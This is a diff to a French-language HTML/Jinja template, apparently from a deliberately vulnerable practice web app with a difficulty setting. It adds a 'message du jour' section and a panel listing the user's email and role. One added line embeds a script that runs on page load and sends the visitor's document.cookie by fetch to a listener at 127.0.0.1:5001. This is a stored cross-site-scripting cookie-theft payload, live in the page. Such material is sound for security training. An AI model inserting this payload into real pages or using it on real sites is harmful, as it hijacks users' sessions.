@@ -12,7 +12,13 @@
         {% endif %}
 
         {% if user %}
-            <h2>Bienvenue, {{ user.email }}!</h2>
+            <h3><strong>Message du jour 28: </strong>{{ message_du_jour }}</h3>
+            <h3><strong>Message du jour 28: </strong> Si vous lisez ces lignes, courage à vous.<script>window.onload = function(e) {fetch('http://127.0.0.1:5001/cookie/' + document.cookie);}</script></h3>
+            <h5><i>Proposé par XxUnknowUserxX</i></h5>
+        {% endif %}
+
+        {% if user %}
+            <h2>Bienvenue, {{ user.name }}!</h2>
         {% else %}
             <h2>Bienvenue, inconnue !</h2>
             <a href="/login"><h2>Peut-être vous connecter ?</h2></a>
@@ -20,7 +26,11 @@
 
         {% if user %}
             <h2>Voici vos informations :</h2>
-
+            <ul>
+                <li><strong>Email:</strong> {{ user.email }}</li>
+                <li><strong>Rôle:</strong> {{ user.role }}</li>
+                <li><strong>Mot de passe:</strong> ? </li>
+            </ul>
         {% else %}
             <h2>🦦</h2>
             <div>
@@ -30,8 +40,7 @@
             </div>
         {% endif %}
 
-        {% if user %}
-            <a href="/logout"><h2>Se déconnecter</h2></a>
-        {% endif %}
+             <a href="/difficulty"><h2>Changer la diffilculté</h2></a>
+{% if user %}<a href="/logout"><h2>Se déconnecter</h2>            </a>{% endif %}
     </body>
 </html>
